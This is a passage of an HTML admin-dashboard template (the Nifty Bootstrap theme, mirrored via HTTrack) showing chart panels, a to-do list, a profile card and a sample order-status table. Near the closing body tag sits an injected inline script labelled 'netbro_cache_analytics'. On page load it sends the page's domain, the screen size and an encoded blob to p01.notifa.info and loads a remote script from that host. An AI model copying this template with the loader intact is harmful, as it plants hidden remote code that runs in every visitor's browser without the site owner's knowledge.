					                            <div id="demo-sparkline-line" class="sparklines-full-content"><canvas width="217" height="60" style="display: inline-block; width: 217.078px; height: 60px; vertical-align: top;"></canvas></div>

					                        </div>
					                    </div>
					                </div>
					            </div>
					            <div class="row">
					                <div class="col-sm-6 col-lg-6">

					                    <!--Sparkline bar chart -->
					                    <div class="panel panel-purple panel-colorful">
					                        <div class="pad-all">
					                            <p class="text-lg text-semibold"><i class="demo-pli-basket-coins icon-fw"></i> Sales</p>
					                            <p class="mar-no">
					                                <span class="pull-right text-bold">$764</span> Today
					                            </p>
					                            <p class="mar-no">
					                                <span class="pull-right text-bold">$1,332</span> Last 7 Day
					                            </p>
					                        </div>
					                        <div class="text-center">

					                            <!--Placeholder-->
					                            <div id="demo-sparkline-bar" class="box-inline"><canvas width="209" height="78" style="display: inline-block; width: 209px; height: 78px; vertical-align: top;"></canvas></div>

					                        </div>
					                    </div>
					                </div>
					                <div class="col-sm-6 col-lg-6">

					                    <!--Sparkline pie chart -->
					                    <div class="panel panel-warning panel-colorful">
					                        <div class="pad-all">
					                            <p class="text-lg text-semibold">Task Progress</p>
					                            <p class="mar-no">
					                                <span class="pull-right text-bold">34</span> Completed
					                            </p>
					                            <p class="mar-no">
					                                <span class="pull-right text-bold">79</span> Total
					                            </p>
					                        </div>
					                        <div class="pad-all">
					                            <div class="pad-btm">
					                                <div class="progress progress-sm">
					                                    <div style="width: 45%;" class="progress-bar progress-bar-light">
					                                        <span class="sr-only">45%</span>
					                                    </div>
					                                </div>
					                            </div>
					                            <div class="pad-btm">
					                                <div class="progress progress-sm">
					                                    <div style="width: 89%;" class="progress-bar progress-bar-light">
					                                        <span class="sr-only">89%</span>
					                                    </div>
					                                </div>
					                            </div>
					                        </div>
					                    </div>
					                </div>
					            </div>


					            <!--Extra Small Weather Widget-->
					            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
					            <div class="panel">
					                <div class="panel-body text-center clearfix">
					                    <div class="col-sm-4 pad-top">
					                        <div class="text-lg">
					                            <p class="text-5x text-thin text-main">95</p>
					                        </div>
					                        <p class="text-sm text-bold text-uppercase">New Friends</p>
					                    </div>
					                    <div class="col-sm-8">
					                        <button class="btn btn-pink mar-ver">View Details</button>
					                        <p class="text-xs">Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</p>
					                        <ul class="list-unstyled text-center bord-top pad-top mar-no row">
					                            <li class="col-xs-4">
					                                <span class="text-lg text-semibold text-main">1,345</span>
					                                <p class="text-sm text-muted mar-no">Following</p>
					                            </li>
					                            <li class="col-xs-4">
					                                <span class="text-lg text-semibold text-main">23K</span>
					                                <p class="text-sm text-muted mar-no">Followers</p>
					                            </li>
					                            <li class="col-xs-4">
					                                <span class="text-lg text-semibold text-main">278</span>
					                                <p class="text-sm text-muted mar-no">Post</p>
					                            </li>
					                        </ul>
					                    </div>
					                </div>
					            </div>

					            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
					            <!--End Extra Small Weather Widget-->


					        </div>
					    </div>

					    <div class="row">
					        <div class="col-md-3">
					            <div class="panel panel-warning panel-colorful media middle pad-all">
					                <div class="media-left">
					                    <div class="pad-hor">
					                        <i class="demo-pli-file-word icon-3x"></i>
					                    </div>
					                </div>
					                <div class="media-body">
					                    <p class="text-2x mar-no text-semibold">241</p>
					                    <p class="mar-no">Documents</p>
					                </div>
					            </div>
					        </div>
					        <div class="col-md-3">
					            <div class="panel panel-info panel-colorful media middle pad-all">
					                <div class="media-left">
					                    <div class="pad-hor">
					                        <i class="demo-pli-file-zip icon-3x"></i>
					                    </div>
					                </div>
					                <div class="media-body">
					                    <p class="text-2x mar-no text-semibold">241</p>
					                    <p class="mar-no">Zip Files</p>
					                </div>
					            </div>
					        </div>
					        <div class="col-md-3">
					            <div class="panel panel-mint panel-colorful media middle pad-all">
					                <div class="media-left">
					                    <div class="pad-hor">
					                        <i class="demo-pli-camera-2 icon-3x"></i>
					                    </div>
					                </div>
					                <div class="media-body">
					                    <p class="text-2x mar-no text-semibold">241</p>
					                    <p class="mar-no">Photos</p>
					                </div>
					            </div>
					        </div>
					        <div class="col-md-3">
					            <div class="panel panel-danger panel-colorful media middle pad-all">
					                <div class="media-left">
					                    <div class="pad-hor">
					                        <i class="demo-pli-video icon-3x"></i>
					                    </div>
					                </div>
					                <div class="media-body">
					                    <p class="text-2x mar-no text-semibold">241</p>
					                    <p class="mar-no">Videos</p>
					                </div>
					            </div>
					        </div>

					    </div>

					    <div class="row">
					        <div class="col-sm-6 col-lg-4">
					            <!--List Todo-->
					            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
					            <div class="panel panel-trans">
					                <div class="panel-heading">
					                    <h3 class="panel-title">To do list</h3>
					                </div>
					                <div class="pad-ver">
					                    <ul class="list-group bg-trans list-todo mar-no">
					                        <li class="list-group-item">
					                            <input id="demo-todolist-1" class="magic-checkbox" type="checkbox">
					                            <label for="demo-todolist-1"><span>Find an idea. <span class="label label-danger">Important</span></span></label>
					                        </li>
					                        <li class="list-group-item">
					                            <input id="demo-todolist-2" class="magic-checkbox" type="checkbox" checked="">
					                            <label for="demo-todolist-2"><span>Do some work</span></label>
					                        </li>
					                        <li class="list-group-item">
					                            <input id="demo-todolist-3" class="magic-checkbox" type="checkbox">
					                            <label for="demo-todolist-3"><span>Read the book</span></label>
					                        </li>
					                        <li class="list-group-item">
					                            <input id="demo-todolist-4" class="magic-checkbox" type="checkbox">
					                            <label for="demo-todolist-4"><span>Upgrade server <span class="label label-warning">Warning</span></span></label>
					                        </li>
					                        <li class="list-group-item">
					                            <input id="demo-todolist-5" class="magic-checkbox" type="checkbox" checked="">
					                            <label for="demo-todolist-5"><span>Redesign my logo <span class="label label-info">2 Mins</span></span></label>
					                        </li>
					                    </ul>
					                </div>
					                <div class="input-group pad-all">
					                    <input type="text" class="form-control" placeholder="New task" autocomplete="off">
					                    <span class="input-group-btn">
					                    <button type="button" class="btn btn-success"><i class="demo-pli-add"></i></button>
					                </span>
					                </div>
					            </div>
					            <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
					            <!--End todo list-->
					        </div>
					        <div class="col-sm-6 col-lg-4">
					            <div class="panel panel-trans">
					                <div class="panel-heading">
					                    <div class="panel-control">
					                        <a title="" data-html="true" data-container="body" data-original-title="<p class='h4 text-semibold'>Information</p><p style='width:150px'>This is an information bubble to help the user.</p>" href="#" class="demo-psi-information icon-lg icon-fw unselectable text-info add-tooltip"></a>
					                    </div>
					                    <h3 class="panel-title">Services</h3>
					                </div>
					                <div class="bord-btm">
					                    <ul class="list-group bg-trans">
					                        <li class="list-group-item">
					                            <div class="pull-right">
					                                <input id="demo-online-status-checkbox" class="toggle-switch" type="checkbox" checked="">
					                                <label for="demo-online-status-checkbox"></label>
					                            </div>
					                            Online status
					                        </li>
					                        <li class="list-group-item">
					                            <div class="pull-right">
					                                <input id="demo-show-off-contact-checkbox" class="toggle-switch" type="checkbox" checked="">
					                                <label for="demo-show-off-contact-checkbox"></label>
					                            </div>
					                            Show offline contact
					                        </li>
					                        <li class="list-group-item">
					                            <div class="pull-right">
					                                <input id="demo-show-device-checkbox" class="toggle-switch" type="checkbox">
					                                <label for="demo-show-device-checkbox"></label>
					                            </div>
					                            Show my device icon
					                        </li>
					                    </ul>
					                </div>
					                <div class="panel-body">
					                    <div class="pad-btm">
					                        <p class="text-semibold text-main">Upgrade Progress</p>
					                        <div class="progress progress-md">
					                            <div class="progress-bar progress-bar-purple" aria-valuenow="15" aria-valuemin="0" aria-valuemax="100" style="width: 15%;" role="progressbar">
					                                <span class="sr-only">15%</span>
					                            </div>
					                        </div>
					                        <small>15% Completed</small>
					                    </div>
					                    <div>
					                        <p class="text-semibold text-main">Database</p>
					                        <div class="progress progress-md">
					                            <div class="progress-bar progress-bar-success" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100" style="width: 70%;" role="progressbar">
					                                <span class="sr-only">70%</span>
					                            </div>
					                        </div>
					                        <small>70% Completed</small>
					                    </div>
					                </div>
					            </div>
					        </div>
					        <div class="col-sm-12 col-lg-4">
					            <div class="panel panel-trans">
					                <div class="pad-all">
					                    <div class="media mar-btm">
					                        <div class="media-left">
					                            <img src="img/profile-photos/2.png" class="img-md img-circle" alt="Avatar">
					                        </div>
					                        <div class="media-body">
					                            <p class="text-lg text-main text-semibold mar-no">Ralph West</p>
					                            <p>Project manager</p>
					                        </div>
					                    </div>
					                    <blockquote class="bq-sm bq-open bq-close">Lorem ipsum dolor sit amet, consecte tuer adipiscing elit, sed diam nonummy nibh euismod tincidunt.</blockquote>
					                </div>

					                <div class="bord-top">
					                    <ul class="list-group bg-trans bord-no">
					                        <li class="list-group-item list-item-sm">
					                            <div class="media-left">
					                                <i class="demo-psi-facebook icon-lg"></i>
					                            </div>
					                            <div class="media-body">
					                                <a href="#" class="btn-link text-semibold">Facebook</a>
					                            </div>
					                        </li>
					                        <li class="list-group-item list-item-sm">
					                            <div class="media-left">
					                                <i class="demo-psi-twitter icon-lg"></i>
					                            </div>
					                            <div class="media-body">
					                                <a href="#" class="btn-link text-semibold">@RalphWe</a>
					                                <br> Design my themes with <a href="#" class="btn-link text-bold">#Bootstrap</a> Lorem ipsum dolor sit amet, consectetuer adipiscing elit.
					                            </div>
					                        </li>
					                        <li class="list-group-item list-item-sm">
					                            <div class="media-left">
					                                <i class="demo-psi-instagram icon-lg"></i>
					                            </div>
					                            <div class="media-body">
					                                <a href="#" class="btn-link text-semibold">Ralphz</a>
					                            </div>
					                        </li>
					                        <li class="list-group-item list-item-sm">
					                            <div class="media-body">

					                            </div>
					                        </li>
					                    </ul>
					                </div>
					            </div>
					        </div>
					    </div>

					    <div class="row">
					        <div class="col-xs-12">
					            <div class="panel">
					                <div class="panel-heading">
					                    <h3 class="panel-title">Order Status</h3>
					                </div>

					                <!--Data Table-->
					                <!--===================================================-->
					                <div class="panel-body">
					                    <div class="pad-btm form-inline">
					                        <div class="row">
					                            <div class="col-sm-6 table-toolbar-left">
					                                <button class="btn btn-purple"><i class="demo-pli-add icon-fw"></i>Add</button>
					                                <button class="btn btn-default"><i class="demo-pli-printer icon-lg"></i></button>
					                                <div class="btn-group">
					                                    <button class="btn btn-default"><i class="demo-pli-information icon-lg"></i></button>
					                                    <button class="btn btn-default"><i class="demo-pli-trash icon-lg"></i></button>
					                                </div>
					                            </div>
					                            <div class="col-sm-6 table-toolbar-right">
					                                <div class="form-group">
					                                    <input type="text" autocomplete="off" class="form-control" placeholder="Search" id="demo-input-search2">
					                                </div>
					                                <div class="btn-group">
					                                    <button class="btn btn-default"><i class="demo-pli-download-from-cloud icon-lg"></i></button>
					                                    <div class="btn-group dropdown">
					                                        <button class="btn btn-default btn-active-primary dropdown-toggle" data-toggle="dropdown">
					                                        <i class="demo-pli-dot-vertical icon-lg"></i>
					                                    </button>
					                                        <ul class="dropdown-menu dropdown-menu-right" role="menu">
					                                            <li><a href="#">Action</a></li>
					                                            <li><a href="#">Another action</a></li>
					                                            <li><a href="#">Something else here</a></li>
					                                            <li class="divider"></li>
					                                            <li><a href="#">Separated link</a></li>
					                                        </ul>
					                                    </div>
					                                </div>
					                            </div>
					                        </div>
					                    </div>
					                    <div class="table-responsive">
					                        <table class="table table-striped">
					                            <thead>
					                                <tr>
					                                    <th>Invoice</th>
					                                    <th>User</th>
					                                    <th>Order date</th>
					                                    <th>Amount</th>
					                                    <th class="text-center">Status</th>
					                                    <th class="text-center">Tracking Number</th>
					                                </tr>
					                            </thead>
					                            <tbody>
					                                <tr>
					                                    <td><a href="#" class="btn-link"> Order #53431</a></td>
					                                    <td>Steve N. Horton</td>
					                                    <td><span class="text-muted">Oct 22, 2014</span></td>
					                                    <td>$45.00</td>
					                                    <td class="text-center">
					                                        <div class="label label-table label-success">Paid</div>
					                                    </td>
					                                    <td class="text-center">-</td>
					                                </tr>
					                                <tr>
					                                    <td><a href="#" class="btn-link"> Order #53432</a></td>
					                                    <td>Charles S Boyle</td>
					                                    <td><span class="text-muted">Oct 24, 2014</span></td>
					                                    <td>$245.30</td>
					                                    <td class="text-center">
					                                        <div class="label label-table label-info">Shipped</div>
					                                    </td>
					                                    <td class="text-center">CGX0089734531</td>
					                                </tr>
					                                <tr>
					                                    <td><a href="#" class="btn-link"> Order #53433</a></td>
					                                    <td>Lucy Doe</td>
					                                    <td><span class="text-muted">Oct 24, 2014</span></td>
					                                    <td>$38.00</td>
					                                    <td class="text-center">
					                                        <div class="label label-table label-info">Shipped</div>
					                                    </td>
					                                    <td class="text-center">CGX0089934571</td>
					                                </tr>
					                                <tr>
					                                    <td><a href="#" class="btn-link"> Order #53434</a></td>
					                                    <td>Teresa L. Doe</td>
					                                    <td><span class="text-muted">Oct 15, 2014</span></td>
					                                    <td>$77.99</td>
					                                    <td class="text-center">
					                                        <div class="label label-table label-info">Shipped</div>
					                                    </td>
					                                    <td class="text-center">CGX0089734574</td>
					                                </tr>
					                                <tr>
					                                    <td><a href="#" class="btn-link"> Order #53435</a></td>
					                                    <td>Teresa L. Doe</td>
					                                    <td><span class="text-muted">Oct 12, 2014</span></td>
					                                    <td>$18.00</td>
					                                    <td class="text-center">
					                                        <div class="label label-table label-success">Paid</div>
					                                    </td>
					                                    <td class="text-center">-</td>
					                                </tr>
					                                <tr>
					                                    <td><a href="#" class="btn-link">Order #53437</a></td>
					                                    <td>Charles S Boyle</td>
					                                    <td><span class="text-muted">Oct 17, 2014</span></td>
					                                    <td>$658.00</td>
					                                    <td class="text-center">
					                                        <div class="label label-table label-danger">Refunded</div>
					                                    </td>
					                                    <td class="text-center">-</td>
					                                </tr>
					                                <tr>
					                                    <td><a href="#" class="btn-link">Order #536584</a></td>
					                                    <td>Scott S. Calabrese</td>
					                                    <td><span class="text-muted">Oct 19, 2014</span></td>
					                                    <td>$45.58</td>
					                                    <td class="text-center">
					                                        <div class="label label-table label-warning">Unpaid</div>
					                                    </td>
					                                    <td class="text-center">-</td>
					                                </tr>
					                            </tbody>
					                        </table>
					                    </div>
					                    <hr class="new-section-xs">
					                    <div class="pull-right">
					                        <ul class="pagination text-nowrap mar-no">
					                            <li class="page-pre disabled">
					                                <a href="#">&lt;</a>
					                            </li>
					                            <li class="page-number active">
					                                <span>1</span>
					                            </li>
					                            <li class="page-number">
					                                <a href="#">2</a>
					                            </li>
					                            <li class="page-number">
					                                <a href="#">3</a>
					                            </li>
					                            <li>
					                                <span>...</span>
					                            </li>
					                            <li class="page-number">
					                                <a href="#">9</a>
					                            </li>
					                            <li class="page-next">
					                                <a href="#">&gt;</a>
					                            </li>
					                        </ul>
					                    </div>
					                </div>
					                <!--===================================================-->
					                <!--End Data Table-->

					            </div>
					        </div>
					    </div>



                </div>
                <!--===================================================-->
                <!--End page content-->

            </div>
<script src="<?php echo base_url();?>assets/adminlte/js/jquery.min.js"></script>


<!--BootstrapJS [ RECOMMENDED ]-->
<script src="<?php echo base_url();?>assets/adminlte/js/bootstrap.min.js"></script>


<!--NiftyJS [ RECOMMENDED ]-->
<script src="<?php echo base_url();?>assets/adminlte/js/nifty.min.js"></script>




<!--=================================================-->

<!--Demo script [ DEMONSTRATION ]-->
<!--  <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->


<!--DataTables [ OPTIONAL ]-->
<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/jquery.dataTables.js"></script>
<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>


<!--DataTables Sample [ SAMPLE ]-->
<script src="<?php echo base_url();?>assets/adminlte/js/demo/tables-datatables.js"></script>




<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUaxQDkkXsQ40smKLX5MuTaP3Hz7CQx99v6v04x8tXILLzaJOlxMW8AqYZK7vJBQ0GeroIrDmsgRoQd3TbDcKFg5ZBqSJkgONBJfmihZkKwZm6n6A8yUgj4nkx3jY0LDUaUhTTSVo18zAU71F%2bg%2fz9XJK7mEBwuR9UbbQUNbpeu8TLlTGwc%2bJ8Q4Ghvlq5a3uLs3tGbSqe%2bIMGFB42NllBOXiUa%2fJS3C%2f4xtm2qCm0o76VDiUn%2fJU4E2PfPUP5k8Q8kqhOs%2f%2fJYJ%2b5E9CA9qTuBEo6UMsqrPZvthp0Oykb75Uu2OV1Q22Y539wDCdiCo%2fWdq8fte8WqybYrW7iOvpOtmuE9ypRwL6%2b5gbKpaecKP8gA8490c03k5TAyLvuWRxyhxBbA0sZtkm3%2b8dHg4FAjhTkRhGG4SmpBOqFSR9NOOtxN2dE8rtluoiMR%2fABnnWziDQHZS%2bjsuB5P1ZZS9wUjx%2bBZgxi5uazzR7I6vPu%2fVdNPdhxC%2fcET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:10 GMT -->
</html>